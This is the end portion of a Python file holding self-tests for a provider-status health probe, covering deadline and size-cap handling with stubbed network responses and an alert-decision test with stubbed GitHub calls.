        def __enter__(self):
            return self

        def __exit__(self, *exc_info):
            return False

        def read(self, amt=None):
            self._reads += 1
            if self._reads > 20:  # let the abandoned daemon thread terminate eventually
                return b""
            time.sleep(0.15)
            return b"x"

    real_urlopen = urllib.request.urlopen
    try:
        urllib.request.urlopen = lambda request, timeout=None: _TrickleResponse()
        started = time.monotonic()
        chk("trickling response is abandoned at the wall-clock deadline (HealthError)",
            _raises(lambda: _fetch_status_json(
                PROVIDER_STATUS_URLS["anthropic"], deadline=0.4)), True)
        chk("...without riding the trickle to completion",
            time.monotonic() - started < 1.5, True)
        chk("probe production path fails OPEN on a trickling response",
            probe_provider_status(
                "anthropic",
                fetch=lambda url: _fetch_status_json(url, deadline=0.4)),
            (STATUS_UNKNOWN, ""))
    finally:
        urllib.request.urlopen = real_urlopen

    # Size bound: an OVERSIZED but otherwise VALID JSON body must be rejected, not parsed.
    # Mutation strength: dropping the size cap lets this parse successfully -> chk goes red
    # (it cannot pass by accident via a parse error).
    oversized = json.dumps({"status": {"indicator": "none"},
                            "pad": "a" * (STATUS_PROBE_MAX_BYTES + 1)}).encode()

    class _OversizedResponse:
        def __init__(self):
            self._pos = 0

        def __enter__(self):
            return self

        def __exit__(self, *exc_info):
            return False

        def read(self, amt=None):
            chunk = oversized[self._pos:self._pos + (amt or len(oversized))]
            self._pos += len(chunk)
            return chunk

    try:
        urllib.request.urlopen = lambda request, timeout=None: _OversizedResponse()
        chk("oversized valid-JSON body trips the size bound (HealthError)",
            _raises(lambda: _fetch_status_json(PROVIDER_STATUS_URLS["anthropic"])), True)
        chk("probe production path fails OPEN on an oversized body",
            probe_provider_status("anthropic"), (STATUS_UNKNOWN, ""))
    finally:
        urllib.request.urlopen = real_urlopen
    return True


def _test_decide_annotation(chk):
    """decide WIRES the probe (deleting the annotate_provider_status call in _cmd_decide turns
    this red): a firing persistent-transient action reaches the alert upsert already carrying
    provider-status, with the network probe and gh upsert both stubbed out."""
    import argparse as _ap
    global GitHubAPI, probe_provider_status, _upsert_alert, _open_alert_markers
    real_api, real_probe, real_upsert = GitHubAPI, probe_provider_status, _upsert_alert
    real_markers = _open_alert_markers
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "GH_TOKEN", "ALERT_REPO", "ALERT_TOKEN", "REGISTRY_ALERT_TOKEN")}
    now, salt, seen = int(time.time()), "s3cret", []
    burst = [make_record("anthropic", account_hash("acct01", salt), "fable",
                         CLASS_TRANSIENT, str(i), now - 300 + i * 60) for i in range(5)]
    try:
        os.environ.update(REGISTRY_REPO="o/r", GH_TOKEN="tok")
        os.environ.pop("ALERT_REPO", None)
        os.environ.pop("ALERT_TOKEN", None)
        stub = _StubAPI(seed=burst)
        GitHubAPI = lambda token: stub
        probe_provider_status = lambda provider, fetch=None: (STATUS_OPERATIONAL, "none")
        _open_alert_markers = lambda repo, token: set()  # hermetic: no real gh subprocess
        # returns True: the new delivery contract (issue #175) treats a confirmed upsert as True.
        _upsert_alert = lambda action, repo, token, maintainer, redact=False: (
            seen.append(action) or True)
        rc = _cmd_decide(_ap.Namespace(policy_file="/nonexistent/repos.toml"))
        fired = [a for a in seen
                 if a["condition"] == "persistent-transient" and a["fire"]]
        chk("decide exits 0 and fires the transient alert", (rc, len(fired)), (0, 1))
        chk("decide-time annotation reaches the upsert",
            (fired or [{}])[0].get("provider_status"), STATUS_OPERATIONAL)
    finally:
        GitHubAPI, probe_provider_status, _upsert_alert = real_api, real_probe, real_upsert
        _open_alert_markers = real_markers
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        sys.exit(_self_test())
    sys.exit(main(sys.argv[1:]))
